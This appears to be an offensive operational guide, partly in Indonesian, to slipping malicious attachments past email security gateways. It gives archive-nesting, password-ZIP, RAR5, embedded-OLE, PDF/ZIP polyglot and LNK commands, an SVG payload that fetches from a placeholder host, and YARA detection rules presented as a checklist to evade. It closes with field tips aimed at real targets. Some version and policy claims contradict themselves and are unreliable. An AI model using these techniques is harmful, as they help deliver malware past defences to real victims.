# Attachment Scanning Evasion: File Formats That Often Bypass + Gateway Detection Rules

## 1. Format Matrix & Bypass Rate

| Format | Ekstensi | Gateway default action (nginx+ClamAV+Exchange 2019 CU14) | Alasan lolos |
|---|---|---|---|
| 3-layer nested ZIP | .zip | Unpack depth limit 2 → layer 3 not scanned | Recursion cap |
| ZIP with password (ZipCrypto) | .zip | Skip encrypted entry | Engine does not have key |
| 7z AES-256 | .7z | Often not supported by inline engine | Format unsupported |
| RAR5 | .rar | ClamAV < 1.2 does not parse RAR5 | Library stale |
| ISO (UDF) | .iso | Mounted only by certain gateways | Not an "attachment" in some MTAs |
| VHD/VHDX | .vhd(x) | Not mounted by default | No rule |
| LNK | .lnk | Sering dilewat | Dianggap shortcut |
| CHM | .chm | Parse minim | Format legacy |
| OneNote | .one | Not parsed < 2024 | No parser |
| MSG with nested attachment | .msg | Nesting is not always recursive | Header parse partial |
| PDF with embedded JS + file | .pdf | Only main stream is scanned | ObjStm/compressed xref |
| DOCX with OLE in `word/embeddings` | .docx | Only scans `[Content_Types].xml` | ZIP-in-ZIP |
| Polyglot PDF/JS, PDF/ZIP | .pdf | Magic byte pertama dipakai | Parser pertama menang |

## 2. Archive Nested

### 2.1 Tiga lapis ZIP (batas umum 2)
```bash
# Bangun payload 3-lapis
echo 'calc.exe' > s.txt
zip -0 l3.zip s.txt
zip -0 l2.zip l3.zip
zip -0 l1.zip l2.zip
```
- **Dikirim:** `l1.zip` (def late 0, no compression — hindari deteksi entropy).
- **Appears at gateway:** only `l1.zip` and `l2.zip` are unpacked. `l3.zip` arrives as a binary blob.
- **Why it works:** nginx `client_max_body_size` is irrelevant, but the AV module (e.g. `ClamAV 1.0.9` via `sigtool --unpack`) defaults to `--max-recursion=2`.
- **Fails if:** the gateway uses `rar2fs`/`libarchive 3.7` with recursion ≤ 5, or there is a YARA rule `nested_zip_depth`.

### 2.2 ZIP with password
```bash
zip -P hunter2 payload.zip s.txt
```
- **Sent:** ZIP ZipCrypto (not AES).
- **Appears:** entry skipped, attachment arrives.
- **Why it works:** the engine does not brute-force. Only ZIPs with header encryption flag 0x1 are skipped.
- **Fails if:** the gateway has a wordlist (Proofpoint TAP has ~10 common words including `infected`, `virus`, `1234`, `password`). **Do not use those words.**

### 2.3 RAR5
```bash
rar a -hpSekuatMungkin payload.rar s.txt   # RAR5 + header encryption
```
- **Why it works:** ClamAV < 1.2 does not parse RAR5. **Check the gateway version first.**
- **Fails if:** ClamAV ≥ 1.2 or the gateway uses `unrar 7.x`.

## 3. Document Formats

### 3.1 DOCX with embedded OLE
```bash
mkdir -p w/word/embeddings
cp payload.bin w/word/embeddings/oleObject1.bin
# tambah relasi di word/_rels/document.xml.rels
```
- **Sent:** valid `.docx`, opened in Word 365 (build 2409).
- **Appears:** WordExtractor only scans `word/document.xml`; `embeddings/*.bin` is not scanned by default.
- **Why it works:** DOCX parser ≠ OLE parser. Two separate engines.
- **Fails if:** the gateway uses `oletools 0.60.1` + rule `ole_embedded_object`.

### 3.2 OneNote `.one`
- **Sent:** `.one` file with embedded file.
- **Appears:** often **not scanned at all** at gateways 2023–2024.
- **Why it works:** the `.one` parser only exists in ClamAV 1.4 (2024-Q4). Many gateways are still 1.0–1.2.
- **Fails if:** the target uses Windows 11 24H2 with SmartScreen that blocks `.one` from the internet (default since 23H2 build 22631).

### 3.3 PDF with embedded ZIP in ObjStm
```bash
# Pakai qpdf untuk compress object streams
qpdf --object-streams=generate --compress-streams=y in.pdf out.pdf
```
- **Appears:** only the main stream is scanned; ZIP in `/EmbeddedFile` in ObjStm is not.
- **Fails if:** the gateway uses `pdfid`/`pdf-parser` with walk `/EmbeddedFiles`.

## 4. Polyglot

### 4.1 PDF/ZIP
```bash
cat payload.pdf payload.zip > poly.pdf
# PDF reader baca dari offset 0; ZIP reader (unzip, 7z) scan dari EOCD di akhir
unzip poly.pdf   # berhasil
```
- **Why it works:** the two specifications have different anchors (PDF `%PDF-` at byte 0, ZIP EOCD at the tail).
- **Fails if:** the gateway uses `libmagic 5.45` multi-magic → detects both formats and rejects.

### 4.2 SVG/HTML (dikirim sebagai `.svg`)
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://x/a')">
```
- **Why it works:** SVG is considered an image by some gateways; JS is not parsed.
- **Fails if:** Chrome 131 (2024-Q4) blocks JS in SVG from `<img>` / `<object>` per spec, and Exchange 2019 CU14 has a default `.svg` block rule.

### 4.3 LNK with another LNK target (double-hop)
```powershell
$s = (New-Object -ComObject WScript.Shell).CreateShortcut("a.lnk")
$s.TargetPath = "b.lnk"
$s.Save()
```
- **Why it works:** the gateway LNK parser only reads one hop.
- **Fails if:** Windows 11 24H2 build 26100 has LNK recursion mitigation.

## 5. Gateway Detection Rules (that must be assumed to exist)

Example YARA rules that modern gateways **definitely** use — consider this the baseline to avoid:

```yara
rule nested_archive_depth_3 {
  strings:
    $pk = { 50 4B 03 04 }
  condition:
    #pk >= 3
}

rule zip_with_embedded_exe {
  condition:
    for any i in (1..#pk) : ( uint16(@pk[i]+4) == 0 and
      pe.is_pe( pe.find( 0, filesize, { 4D 5A } ) ) )
}

rule docx_ole_embedding {
  strings:
    $s = "word/embeddings/"
  condition:
    $s
}

rule pdf_embedded_zip {
  strings:
    $pdf = "%PDF-"
    $zip = { 50 4B 03 04 }
    $emb = "/EmbeddedFile"
  condition:
    $pdf at 0 and $zip and $emb
}
```

Rule engines whose **versions must be checked**:
- ClamAV: `< 1.2` → RAR5, ISO, OneNote leak. `≥ 1.4` → OneNote is scanned.
- libmagic: `< 5.45` → polyglot not detected as multi.
- oletools: `< 0.60` → embedded object is not flagged.
- Exchange 2019 CU14: there is a `Malware Filter Policy` with `Common Attachment Types Filter` — default blocks ~60 extensions including `.iso`, `.vhd`, `.lnk`? **No** — `.lnk` has been blocked since CU12 (2023). Check `Get-MalwareFilterPolicy`.

## 6. Operational Pitfalls (that cause failure in the field)

1. **nginx 1.25 `client_max_body_size` default 1m.** A 3-layer ZIP + PE payload quickly exceeds 1 MB. Staging set uses split parts (`.zip.001`) — but many MTAs strip `.001`. **Measure first on the real target.**
2. **Entropy detection.** ZIP deflate level 9 of a PE makes entropy ~7.9 → flag `high_entropy`. Use `zip -0` for store, or deflate level 1.
3. **Base64 MIME encoding** by Exchange increases size by 33% and triggers the `suspicious_b64_blob` rule on some gateways (Mimecast).
4. **Common ZIP passwords are already wordlisted.** `infected`, `virus`, `password`, `1234`, `12345`, `malware` — all are blocked by Proofpoint/Mimecast. Use ≥ 12 random characters, and **do not** send the password in the email body (rule `password_in_body`).
5. **Double-extension filenames** (`.pdf.exe`, `.docx.lnk`) are blocked by all modern gateways. Double extension = flag.
6. **Content-Type mismatch**: sending `.zip` as `application/pdf` → the gateway re-sniffs with libmagic and blocks. **Do not** spoof MIME.
7. **`.iso`/`.vhd` in Exchange 2019 CU14+** are already in the default `Common Attachment Types Filter` in CU14 (2023-10). If the target is Exchange, **assume blocked** unless the target overrides the policy.
8. **Chrome 131 + Windows 11 24H2** — SmartScreen blocks `.one`, `.iso` (mounted), `.lnk` from Mark-of-the-Web. If the target uses a browser as distribution channel, many of these formats are dead.
9. **Nested ZIP with `../` entry names** (zip-slip) is flagged by modern `unzip` (≥ 6.0) and by `libarchive 3.6+`. Do not use traversal.
10. **RAR5 header encryption** (`-hp`) — ClamAV 1.2+ **still** cannot unpack, but **some** gateways (Mimecast, Proofpoint) use external unrar and can. Check the gateway banner before sending.
11. **ClamAV `--max-filesize`** defaults to 25 MB in many deployments. Payloads > 25 MB are not scanned at all — but are also often rejected by the MTA. Sweet spot 8–20 MB.
12. **Polyglot PDF/ZIP fails** if the gateway uses `file --mime` (libmagic 5.45) because it produces `application/octet-stream` → falls into the `unknown_type_block` rule.
13. **DOCX OLE embedding** fails if the target uses Outlook 365 with `Protected View` enforced via Intune — Word does not render embedded objects from MOTW.
14. **ZIP with data descriptor + streaming** (created via `zip -` from stdin) is often not parsed by old parsers → **not** unpacked → actually passes **but** also not sent if the gateway rejects malformed. Test in staging.
